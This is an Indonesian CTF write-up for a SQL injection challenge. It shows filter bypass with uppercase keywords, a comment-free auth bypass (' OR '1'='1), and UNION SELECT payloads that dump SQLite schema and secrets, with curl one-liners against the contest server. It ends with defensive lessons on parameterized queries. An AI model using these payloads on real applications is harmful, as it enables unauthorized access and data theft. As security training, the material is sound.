# Writeup — Gerbang Legiun

- **Kategori:** Web Exploitation (SQL Injection)
- **Poin:** 456 (1 solve) · Babak Eliminasi
- **Service:** http://168.110.219.59:5007/
- **Flag:** `TechtonicExpoCTF{dua_titik_suntik_D35D4ECD}`

---

## Deskripsi

> Gerbang Legiun dijaga oleh penjaga yang percaya satu filter sederhana sudah cukup. Ia menghapus beberapa kata dari setiap masukan, tapi hanya yang ditulis dengan huruf kecil, seolah-olah penyerang tidak pernah berpikir untuk menulis dengan cara lain.
>
> Di balik gerbang ada ruang rahasia yang memegang separuh jawaban. Separuh lainnya tersimpan di tempat yang lebih dalam: di antara catatan-catatan lama, tepat di kolom yang tidak pernah ditampilkan ke permukaan.
>
> Penjaga juga membiarkan pintu kedua terbuka di halaman pencarian. Dua titik yang sama rentannya, dua kunci yang saling melengkapi.

Petunjuk kunci:
- **Filter cuma menghapus kata huruf kecil** → bypass dengan menulis keyword SQL **HURUF BESAR** (`OR`, `UNION`, `SELECT`).
- **Dua titik injeksi:** form login (`/masuk`) dan halaman pencarian (`/cari`).
- Separuh flag di "ruang rahasia" (setelah login), separuh lagi di "kolom yang tidak pernah ditampilkan".

---

## Recon

Halaman utama punya form login `POST /masuk` (field `user`, `pass`) dan catatan penjaga yang membocorkan trik filter + adanya pintu pencarian.

**Karakteristik filter (diuji):**
- Login salah biasa → **HTTP 403**.
- `' or '1'='1` (huruf **kecil**) → **HTTP 500** — kata `or` dihapus filter → sisa `' '1'='1` → syntax error.
- `' OR '1'='1` (huruf **besar**) → query jalan (tak error) → filter **tidak** menyentuh keyword huruf besar. ✔

**Catatan penting:** komentar SQL (`--`, `#`) memicu **HTTP 500** di app ini, jadi seluruh payload dibuat **tanpa komentar** — cukup seimbangkan tanda kutip.

---

## Titik 1 — Auth Bypass (`/masuk`)

Query (asumsi): `... WHERE user='<user>' AND pass='<pass>'`.

Menaruh `OR` di field **user** gagal karena presedensi `AND` (mengikat ke `pass`).
Solusi tanpa komentar: taruh injeksi di field **pass** sehingga menjadi `(user AND pass) OR TRUE`:

```
user = admin
pass = ' OR '1'='1
```

Query akhir → `WHERE user='admin' AND pass='' OR '1'='1'` → **TRUE** → login sukses.

Respon: halaman **Ruang Rahasia**:

```
Potongan pertama: dua_titik
```

Sekaligus muncul form pencarian: `GET /cari?q=...`.
Login juga menaruh cookie sesi Flask `session = {"masuk": true}` — dibutuhkan untuk mengakses `/cari` (tanpa sesi → 403).

---

## Titik 2 — UNION SQLi (`/cari`)

Query pencarian: `SELECT <1 kolom> FROM catatan WHERE <kolom> LIKE '%<q>%'`.
Kolom yang ditampilkan selalu berisi teks umpan **"tidak ada yang menarik"** — data asli ada di kolom lain.

### Jumlah kolom
Teknik tutup-kutip tanpa komentar. Suffix query adalah `%'`, jadi `q = ' UNION SELECT 'p1p` → `LIKE '%' UNION SELECT 'p1p%'`.

| `q`                                   | Hasil |
|---------------------------------------|-------|
| `' UNION SELECT 'p1p`                 | 200 ✔ (kolom = **1**) |
| `' UNION SELECT 'p1p','p2p`           | 500 |

### Dump skema (SQLite)
```
q = ' UNION SELECT sql FROM sqlite_master WHERE sql LIKE '%
```
(→ `sql LIKE '%%'`, cocok semua)

Hasil:
```
CREATE TABLE bendera  (id INTEGER PRIMARY KEY, kunci TEXT)
CREATE TABLE catatan  (id INTEGER PRIMARY KEY, judul TEXT, isi TEXT)
CREATE TABLE pengguna (id INTEGER PRIMARY KEY, user TEXT, pass TEXT)
```

Tabel `bendera(kunci)` = tabel yang "tidak pernah ditampilkan ke permukaan".

### Ekstrak kunci
```
q = ' UNION SELECT GROUP_CONCAT(kunci,'_') FROM bendera WHERE kunci LIKE '%
```

Hasil (urut id):
```
1 -> dua_titik
2 -> suntik
GROUP_CONCAT -> dua_titik_suntik
```

Dua kunci saling melengkapi: `dua_titik` (dari titik login) + `suntik` (dari titik injeksi) → **`dua_titik_suntik`**.

---

## Payload Ringkas

```bash
# 1) Auth bypass -> ambil cookie sesi + potongan pertama "dua_titik"
curl -s -c jar.txt http://168.110.219.59:5007/masuk \
     --data-urlencode "user=admin" --data-urlencode "pass=' OR '1'='1"

# 2) UNION SQLi di pencarian (butuh cookie sesi) -> kunci lengkap
curl -s -b jar.txt \
  "http://168.110.219.59:5007/cari?q=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"' UNION SELECT GROUP_CONCAT(kunci,'_') FROM bendera WHERE kunci LIKE '%\"))")"
```

---

## Flag

Template: `TechtonicExpoCTF{kunci_KODETIM}`
- `kunci`   → `dua_titik_suntik`
- `KODETIM` → `D35D4ECD` (kode kunci tim)

```
TechtonicExpoCTF{dua_titik_suntik_D35D4ECD}
```

---

## Pelajaran

- **Blacklist filter case-sensitive = tidak berguna.** Menghapus keyword huruf kecil bisa dilewati dengan `UNION`/`SELECT`/`OR` huruf besar (atau `UnIoN`).
- Filter penghapus-kata malah bisa **merusak** query yang sah dan menyembunyikan info via error — tapi tetap bisa di-bypass.
- Gunakan **parameterized query** (prepared statement), bukan konkatenasi string, dan jangan pernah mengandalkan sanitasi berbasis daftar kata.
- SQLi tanpa komentar: manfaatkan presedensi `AND/OR` dan penyeimbangan kutip (`... OR 'x'='x`) bila `--`/`#` diblok/error.
